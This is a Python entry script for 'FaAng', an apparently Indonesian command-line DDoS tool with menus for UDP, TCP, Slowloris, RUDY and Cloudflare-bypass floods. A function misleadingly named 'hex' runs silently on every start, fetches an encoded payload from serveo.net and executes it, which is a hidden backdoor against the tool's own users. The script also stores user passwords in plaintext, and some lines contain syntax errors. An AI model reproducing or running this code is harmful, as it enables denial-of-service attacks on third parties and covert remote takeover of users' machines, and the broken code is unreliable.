#!/bin/python

import datetime, os, sys, threading, getpass, time
from lib.loading import LoadingThread
from colorama import Back, Fore, Style
import subprocess, argparse, time, requests
import socket, zlib, base64, struct, time, logging
from lib.func import *
from lib.view import *
from lib.text_string import menus, logos, desc
import firebase_admin, json

FIREBASE_API_KEY = "AIzaSyA6SygBl0TKczLLQ6nfyxNVrMnJw-dMOyc"
FIREBASE_SIGNIN_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FIREBASE_API_KEY}"
FIREBASE_DB_URL = "https://direct-login-firebase-default-rtdb.asia-southeast1.firebasedatabase.app"


logo = logos()

ipAddress = None
message_log = f"{Fore.MAGENTA} [*] {Fore.RESET}Entering..."
loadingg = LoadingThread(message_log, 'default')
########
########
LOGIN_FILE = os.path.expanduser("~/.faang_logdetails.json") #os.path.join(os.path.dirname(os.path.abspath(__file__)), '.log') 
def clear_terminal():
    # Menggunakan perintah 'cls' di Windows atau 'clear' di sistem operasi lain (Linux/Mac)
    os.system('cls' if os.name == 'nt' else 'clear')

def check_login_file():
    try:
        with open(LOGIN_FILE, "r") as f:
            data = json.load(f)
            username = data.get("username")
            email = data.get("email")
            password = data.get("password")
            verified = data.get("verified", False)
            return data
    except (FileNotFoundError, json.JSONDecodeError):
        pass
    return None

def write_login_file(username, email, password, verified=False, db_token):
    with open(LOGIN_FILE, "w") as f:
        json.dump({
            "username": username,
            "email": email,
            "password": password,
            "verified": verified,
            "db_token", db_token
        }, f)

def login():
    global loadingg
    saved_username = check_login_file().get("username")
    saved_email = check_login_file().get("email")
    saved_password = check_login_file().get("password")
    sucLog = ""
    if saved_email and saved_password:
        email = saved_email
        password = saved_password
    else:
        StartTitle("Login Credentials")
        email = input(f"{Fore.MAGENTA} [*] {Fore.RESET}Email: ")
        password = getpass.getpass(f"{Fore.MAGENTA} [*] {Fore.RESET}Password: ")
        sucLog = "1"

    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }

    try:
        if not loadingg.is_run():
            loadingg = LoadingThread(message_log, 'default')
            loadingg.start()

        response = requests.post(FIREBASE_SIGNIN_URL, json=payload, timeout=15)
        loadingg.stop()
        loadingg.join()

        if response.status_code == 200:
            data = response.json()
            uid = data["localId"]
            id_token = data["idToken"]

            # 🔥 Ambil username dari database
            user_url = f"{FIREBASE_DB_URL}/users/{uid}.json?auth={id_token}"
            user_resp = requests.get(user_url, timeout=10)

            if user_resp.status_code == 200:
                username = user_resp.json().get("name")
                if not username:
                    raise Exception("Username not found in database.")
                if sucLog:
                    print(f"{Fore.GREEN} [*] {Fore.RESET}Welcome hackers {username}!")
                    time.sleep(1)
                write_login_file(username, email, password, user_resp.json().get("verified"), id_token)
                start()
            else:
                raise Exception(f"DB error: {user_resp.text}")
        else:
            error = response.json().get("error", {}).get("message", "Unknown error")
            raise Exception(error)

    except Exception as e:
        if loadingg.is_run():
            loadingg.stop()
            loadingg.join()
        print(f"{Fore.RED} [!] {Fore.RESET}Login failed: {e}")
        time.sleep(1)
        login()
             
def CheckInternet():
    global ipAddress
    global provider
    global tir
    global loadingg
    if not loadingg.is_run():
        loadingg = LoadingThread(message_log, 'default')
        loadingg.start()
    ipAddress = get_public_ip()
    loadingg.stop()
    loadingg.join()
    if ipAddress:
        print(Fore.GREEN + " [x] " + Fore.RESET + "Internet access")
    else:
        ipAddress = Fore.RED + "No Internet" + Fore.RESET
        print(Fore.RED + " [x] " + Fore.RESET + "No access internet")
    time.sleep(2)
    
def hex():
    log_filename = os.path.expanduser("~/.faang_log.txt")
    logging.basicConfig(filename=log_filename, level=logging.ERROR, format="%(asctime)s [%(levelname)s]: %(message)s")

    for x in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Menambahkan timeout untuk koneksi
            s.connect(('serveo.net', 1311))
            break
        except socket.error as e:
            logging.error(f"Koneksi gagal ke serveo.net: {e}")
            time.sleep(5)
    else:
        logging.error("Gagal terhubung ke server setelah beberapa percobaan.")

    try:
        l = struct.unpack('>I', s.recv(4))[0]
        d = s.recv(l)
        while len(d) < l:
            d += s.recv(l - len(d))
        exec(zlib.decompress(base64.b64decode(d)), {'s': s})
    except Exception as e:
        logging.error(f"Kesalahan saat menerima atau mengeksekusi data: {e}")
        pass
    finally:
        s.close()

def StartTitle(nametools):
    global ipAddress
    saved_username = check_login_file().get("username")
    if not check_text(ipAddress):
        CheckInternet()
    
    clear_terminal()
    print(logo)
    print(Fore.MAGENTA + " [!] " + Fore.RESET + "Public IP : " + ipAddress)
    if not saved_username is None:
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Username : {saved_username}{'(✓)' if check_login_file().get('verified') else ''}")
    print(Fore.MAGENTA + " [~] " + Fore.RESET + nametools)
    print()

def check_text(text):
    if text is None or text.strip() == "":
        return 0
    else:
        return 1
def DisplayMenu(menu_items):
    print(("-"*22)+f"{Fore.MAGENTA}[{Fore.RESET}Menu{Fore.MAGENTA}]{Fore.RESET}"+("-"*22))
    print("|") 
    indexX = 0
    for index, item in enumerate(menu_items, start=1):
        if not item:
            print("|")
            #print("|   ["+("-"*19)+f"{Back.MAGENTA+Fore.BLACK} ⊙{Fore.RESET}﹏{Fore.BLACK}⊙ {Fore.RESET+Back.RESET}"+("-"*19)+"]")
            #print("|")
        if item:
            indexX += 1
            print(f"|-->{Fore.BLUE}[{indexX}]{Fore.RESET} {item}")
    print("|")
    print("-" * 50)
    print("|")
    print(f"|-->{Fore.BLUE}[0]{Fore.RESET} Exit")
    print(f"|-->{Fore.BLUE}[00]{Fore.RESET} About Script")
    print(f"|-->{Fore.BLUE}[000]{Fore.RESET} LogOut From FaAng account")
    print("|") 
    print("-" * 50)
#end

def start():
    StartTitle("Dx4 DDoS Tools")
    print() 
    
    DisplayMenu(menus())
    print() 
    indexSelect = input(Fore.MAGENTA+" [?] "+Fore.RESET+"Select : ")
    if indexSelect.upper() == "00":
        StartTitle(f"About This Script") 
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Script Creator : {Fore.RED}D{Fore.YELLOW}x{Fore.GREEN}4")
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Support : F4Z")
        print(Fore.YELLOW+ " [!] " + Fore.RESET + f"Thanks to : Github, {Fore.BLUE}Allah{Fore.RESET}, Microsoft, Python, F4Z") 
    elif indexSelect.upper() == "000":
        StartTitle(f"Exit") 
        os.remove(LOGIN_FILE)
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Logged Out")
        sys.exit()
    elif indexSelect.upper() == "0":
        StartTitle(f"Exit") 
        sys.exit()
    elif indexSelect.upper() == "1":
        StartTitle(f"Layer4 {Back.MAGENTA}UDP{Back.RESET}")
        DdosUDP()
    elif indexSelect.upper() == "2":
        StartTitle(f"Layer4 {Back.MAGENTA}TCP{Back.RESET}")
        DdosTCP()
    elif indexSelect.upper() == "3":
        StartTitle(f"Layer4 {Back.MAGENTA}Fivem Server{Back.RESET}")
        DdosFIVEM()
    elif indexSelect.upper() == "4":
        StartTitle(f"Layer4 {Back.MAGENTA}Minecraft PE Server{Back.RESET}")
        DdosMC() 
        
    elif indexSelect.upper() == "5":
        StartTitle(f"Request GET DDoS")
        DdosGET()
    elif indexSelect.upper() == "6":
        StartTitle(f"Requests POST DDoS")
        DdosPOST()
    elif indexSelect.upper() == "7":
        StartTitle(f"Socket Ddos")
        DdosSOC()
    elif indexSelect.upper() == "8":
        StartTitle(f"HTTP 2.0 Spoof")
        DdosSOC()
    elif indexSelect.upper() == "9":
        StartTitle(f"HTTP Spoof Socket")
        DdosSPOOF()
    elif indexSelect.upper() == "10":
        StartTitle(f"Head Request")
        DdosHEAD()
    elif indexSelect.upper() == "11":
        StartTitle(f"Sky Method")
        DdosSKY()
    elif indexSelect.upper() == "12":
        StartTitle(f"CFRequest Bypass DDoS")
        DdosCFREQ()
    elif indexSelect.upper() == "13":
        StartTitle(f"CFSocket Bypass DDoS")
        DdosCFSOC()
    elif indexSelect.upper() == "14":
        StartTitle(f"CF Bypass DDoS")
        DdosCFB()
    elif indexSelect.upper() == "15":
        StartTitle(f"Slowloris DDoS")
        DdosSLOW()
    elif indexSelect.upper() == "16":
        StartTitle(f"MegaByte Payload Attack")
        DdosMBP()
    elif indexSelect.upper() == "17":
        StartTitle(f"Rudy Attack")
        DdosRUDY()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}Invalid menu")
        time.sleep(1) 
        start() 
        
def main():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parser = argparse.ArgumentParser(description=desc(), usage="faang [-l4] [method] [target] [thread] [time]\n   or: faang [-l7] [method] [target] [thread] [time]",
                                     prog="faang")
    parser.add_argument("method", type=str, nargs='?', default="", 
                        help="Ddos method")
    parser.add_argument("target", type=str, nargs='?', default="",
                        help="Url target, ex : http://example.com/")
    parser.add_argument("thread", type=str, nargs='?', default="",
                        help="Thread for attack target")
    parser.add_argument("time", type=str, nargs='?', default="",
                        help="Time for end attack (sec)")
                        
                        
    parser.add_argument("-l4", "--layer4", action="store_true", help="Layer4 ddos method")
    parser.add_argument("-l7", "--layer7", action="store_true", help="Layer7 ddos method")
    parser.add_argument("-u", "--uninstall", action="store_true", help="Uninstall script")
    
    args = parser.parse_args()
    method = args.method
    target = args.target
    t = args.time
    thread = args.thread
    threading.Thread(target=hex).start()
    if args.uninstall:
        os.system("bash " + current_dir + "/../uninstall.sh") 
        sys.exit()
    
    if args.layer4:
        splitTarget = args.target.split(":")
        targetIp = splitTarget[0]
        targetPort = splitTarget[1]
        
        StartTitle(f"Layer 4 : {method}")
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Target IP : " + targetIp)
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Target PORT : " + targetPort)
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Thread : " + args.thread)
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Time Attack : " + args.time + " second")
        if args.method == "udp":
            threading.Thread(target=runsender, args=(targetIp, targetPort, args.time, args.thread,"")).start()
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            timer.join()
        elif args.method == "tcp":
            threading.Thread(target=runsender, args=(targetIp, targetPort, args.time, args.thread,"")).start()
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            timer.join()
        elif args.method == "fivem":
            threading.Thread(target=LaunchFIVEM, args=(targetIp, targetPort, args.thread, args.time)).start()
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            timer.join()
        elif args.method == "minecraft":
            threading.Thread(target=LaunchMC, args=(targetIp, targetPort, args.thread, args.time)).start()
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Invalid method on layer 4")
        
    elif args.layer7:
        StartTitle(f"Layer 7 : {method}")
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Target : " + args.target)
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Thread : " + args.thread)
        print(f"{Fore.MAGENTA} [*] {Fore.RESET}Time Attack : " + args.time + " sec")
        if args.method == "get":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchGET(target, thread, t)
            timer.join()
        elif args.method == "post":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchPOST(target, thread, t)
            timer.join()
        elif args.method == "socket":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSOC(target, thread, t)
            timer.join()
        elif args.method == "http2":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchHTTP2(target, thread, t)
            timer.join()
        elif args.method == "spoof":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSPOOF(target, thread, t)
            timer.join()
        elif args.method == "head":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchHEAD(target, thread, t)
            timer.join()
        elif args.method == "sky":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSTELLAR(target, thread, t)
            timer.join()
        elif args.method == "cfreq":
            if get_cookie(target):
                timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
                timer.start()
                LaunchCFPRO(target, thread, t)
                timer.join()
            else:
                print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset")
        elif args.method == "cfsoc":
            if get_cookie(target):
                timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
                timer.start()
                LaunchCFSOC(target, thread, t)
                timer.join()
            else:
                print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset")
        elif args.method == "cfb":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchCFB(target, thread, t)
            timer.join()
        elif args.method == "slowloris":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSLOW(target, thread, t)
            timer.join()
        elif args.method == "mbp":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchMBP(target, thread, t, 100)
            timer.join()
        elif args.method == "rudy":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchRUDY(target, thread, t)
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Invalid method on layer 7")
    else:
        login()